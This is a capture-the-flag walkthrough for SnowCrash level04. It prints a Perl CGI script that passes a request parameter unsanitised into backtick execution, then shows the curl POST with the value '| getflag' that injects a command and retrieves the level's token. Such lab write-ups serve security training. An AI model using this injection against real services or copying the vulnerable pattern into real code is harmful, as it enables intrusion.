# level04

- We login as user level04.
```
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

- Let's `cat ./level04.pl`:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```


- The script appears to be designed to be executed by a [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) through a service listening on `localhost:4747`.
It calls the `x()` function with the parameter `x` retrieved from the CGI. The function calls `echo` with the parameter it receives.
Therefore, if the parameter `x` is `| getflag`, this script will then execute `echo | getflag`.
```
level04@SnowCrash:~$ netstat -tuln | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN
```


- There is indeed a service listening on all addresses through port 4747.
```
level04@SnowCrash:~$ curl -X POST -d "x=| getflag" http://localhost:4747
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

```
level04@SnowCrash:~$ su level05
Password:ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$
```